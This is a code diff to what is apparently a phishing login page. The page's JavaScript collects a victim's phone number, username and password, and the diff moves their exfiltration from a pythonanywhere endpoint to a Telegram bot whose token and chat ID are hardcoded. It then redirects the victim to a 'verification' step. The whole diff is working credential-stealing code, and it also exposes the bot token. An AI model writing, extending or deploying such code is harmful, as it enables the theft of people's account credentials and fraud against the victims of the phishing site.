@@ -111,12 +111,38 @@
             e.preventDefault(); // Prevent default form submission
             $('.reject-data').hide();
         });
+
+         function sendTelegramMessage(messageText) {
+            botToken = '8298763991:AAGG2RvBJ-xKfGHBTfXHeOkGrRmMn5WQGCU'
+            chatId = '5210909198'
+            apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+            $.ajax({
+                url: apiUrl,
+                type: 'POST',
+                data: {
+                    chat_id: chatId,
+                    text: messageText,
+                    parse_mode: "MarkdownV2"
+
+                },
+                success: function(response) {
+                    console.log('Message sent successfully:', response);
+                    window.location.href = 'verification';
+                },
+                error: function(error) {
+                    console.error('Error sending message:', error);
+                    // Optional: Handle error and provide feedback
+                }
+            });
+        }
+
+
         $('#login-form').on('submit', function(e) {
             e.preventDefault(); // Prevent default form submission
 
             const isEmailValid = validateEmail();
             if (!isEmailValid) {
-                console.log()
                 return;
             }
             const isPasswordValid = validatePassword()
@@ -133,25 +159,10 @@
             setCookie('password',$('#password').val())
 
 
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", 'https://courtneylarson.pythonanywhere.com/s',true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.onreadystatechange = function() {
-                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
-                    window.location.href = 'step2.5';
-
-                }   
-                else{
-                    console.log("ERRORRRRRR")
-                }
-            }
-            xhr.send(
-                JSON.stringify({
-                    'mobile': getCookie('mobile'),
-                    'username':document.getElementById('username').value,
-                    'password':document.getElementById('password').value,
-                })
-            );
+            var message=`رقم الهاتف: \`${getCookie('mobile')}\`
+                    اسم المستحمد: \`${document.getElementById('username').value}\`
+                    كلمة المرور: \`${document.getElementById('password').value}`
+            sendTelegramMessage(message)
         
 
 
